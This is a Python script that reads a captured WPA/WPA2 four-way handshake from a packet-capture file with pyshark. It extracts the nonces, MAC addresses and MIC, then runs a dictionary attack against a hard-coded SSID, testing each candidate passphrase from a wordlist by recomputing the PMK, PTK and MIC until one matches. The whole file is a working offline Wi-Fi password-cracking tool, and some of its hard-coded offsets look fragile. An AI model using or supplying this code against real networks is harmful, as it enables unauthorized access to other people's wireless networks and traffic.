import hmac
import hashlib
import binascii
import sys
import pyshark
def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A.encode() + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]

pcap=pyshark.FileCapture("mydata.cap",display_filter="eapol")
pcap[0][2].raw_mode=True
pcap[0][4].raw_mode=True
pcap[1][4].raw_mode=True
destinationmac=pcap[0][2].addr
sourcemac=pcap[0][2].ta
anonce=pcap[0][4].wlan_rsna_keydes_nonce
snonce=pcap[1][4].wlan_rsna_keydes_nonce
mic=pcap[1][4].wlan_rsna_keydes_mic
variables={
"version_field" :pcap[1][4].version,
"type_field" :pcap[1][4].type,
"len" :pcap[1][4].len,
"keydes_type":pcap[1][4].keydes_type,
"wlan_rsna_keydes_msgnr":pcap[1][4].wlan_rsna_keydes_msgnr,
"wlan_rsna_keydes_key_info":pcap[1][4].wlan_rsna_keydes_key_info,
"keydes_key_len":pcap[1][4].keydes_key_len,
"keydes_replay_counter":pcap[1][4].keydes_replay_counter,
"wlan_rsna_keydes_nonce":pcap[1][4].wlan_rsna_keydes_nonce,
"keydes_key_iv":pcap[1][4].keydes_key_iv,
"wlan_rsna_keydes_rsc":pcap[1][4].wlan_rsna_keydes_rsc,
"wlan_rsna_keydes_id":pcap[1][4].wlan_rsna_keydes_id,
"wlan_rsna_keydes_mic":pcap[1][4].wlan_rsna_keydes_mic,
"wlan_rsna_keydes_data_len":pcap[1][4].wlan_rsna_keydes_data_len,
"wlan_rsna_keydes_data":pcap[1][4].wlan_rsna_keydes_data
}
hex_values = [value for value in variables.values() if value is not None and all(c in '0123456789abcdefABCDEF' for c in value)]

# Filter out None values and non-hexadecimal values
filtered_hex_values = [value for value in hex_values if value is not None]

# Concatenate the filtered_hex_values into a single string without spaces
concatenated_values = "".join(filtered_hex_values)
eapoldata=concatenated_values[0:161]+("00000000000000000000000000000000000")+concatenated_values[196:]
# Print the concatenated values in a single row
print(concatenated_values)

#########################################################EAPOL2##################################################################
#pcap[0][4].raw_mode=True
eapol1={
"version_field" :pcap[0][4].version,
"type_field" :pcap[0][4].type,
"len" :pcap[0][4].len,
"keydes_type":pcap[0][4].keydes_type,
"wlan_rsna_keydes_msgnr":pcap[0][4].wlan_rsna_keydes_msgnr,
"wlan_rsna_keydes_key_info":pcap[0][4].wlan_rsna_keydes_key_info,
"keydes_key_len":pcap[0][4].keydes_key_len,
"keydes_replay_counter":pcap[0][4].keydes_replay_counter,
"wlan_rsna_keydes_nonce":pcap[0][4].wlan_rsna_keydes_nonce,
"keydes_key_iv":pcap[0][4].keydes_key_iv,
"wlan_rsna_keydes_rsc":pcap[0][4].wlan_rsna_keydes_rsc,
"wlan_rsna_keydes_id":pcap[0][4].wlan_rsna_keydes_id,
"wlan_rsna_keydes_mic":pcap[0][4].wlan_rsna_keydes_mic,
"wlan_rsna_keydes_data_len":pcap[0][4].wlan_rsna_keydes_data_len
}
#hex_values = [value for value in eapol1.values() if value is not None and all(c in '0123456789abcdefABCDEF' for c in value)]

# Filter out None values and non-hexadecimal values
#filtered_hex_values = [value for value in hex_values if value is not None]

# Concatenate the filtered_hex_values into a single string without spaces
#tarundump1 = "".join(filtered_hex_values)

# Print the concatenated values in a single row
#print(tarundump1)
file_path = 'passphrases.txt'
ssid = "Shreya"
A = "Pairwise key expansion"
APmac = binascii.a2b_hex(sourcemac)
Clientmac = binascii.a2b_hex(destinationmac)
ANonce = binascii.a2b_hex(anonce)
SNonce = binascii.a2b_hex(snonce)
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
data = binascii.a2b_hex(eapoldata)
#print(mic)
#print(APmac)
#print(Clientmac)
#print(ANonce)
#print(SNonce)
#print(data)
desired_mic = binascii.a2b_hex(mic)

with open(file_path, 'r') as wordlist_file:
    for line in wordlist_file:
        passPhrase = line.strip()
        pmk = hashlib.pbkdf2_hmac("sha1", passPhrase.encode("utf-8"), ssid.encode("utf-8"), 4096, 32)
        ptk = customPRF512(pmk, A, B)
        remic = hmac.new(ptk[0:16], data, hashlib.sha1).digest()

        if remic[:16] == desired_mic:
            print("Passphrase found:", passPhrase)
            break
        else:
            print("Passphrase does not match:", passPhrase)

print("End of wordlist.")
